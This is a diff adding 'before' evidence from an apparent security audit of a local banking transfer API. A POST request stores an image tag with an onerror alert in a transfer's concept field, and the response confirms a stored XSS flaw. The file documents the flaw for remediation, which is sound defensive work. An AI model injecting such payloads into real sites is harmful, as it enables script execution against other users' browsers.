@@ -1,0 +1,23 @@
+EVIDENCIA ORIGINAL - ANTES
+Fuente: docs/evidencias/antes-http.txt
+Fase: antes
+Fecha UTC: 2026-11-14T21:59:27.534697+00:00
+Base: http://localhost:8080
+
+XSS ALMACENADO
+POST /api/transacciones/transferir
+HTTP 201
+Content-Type: application/json
+{
+  "id": 6,
+  "cuentaOrigenId": 2,
+  "numeroCuentaOrigen": "CR05015202001026458901",
+  "titularOrigen": "Carlos Mora Morales",
+  "cuentaDestinoId": 3,
+  "numeroCuentaDestino": "CR05015202001026458902",
+  "titularDestino": "María Rojas Soto",
+  "monto": 1,
+  "conceptoHtml": "<img src=\"x\" onerror=\"alert('AUDITORIA XSS CONFIRMADA')\">",
+  "fecha": "2026-11-14T15:59:41.2706624",
+  "estado": "COMPLETADA"
+}
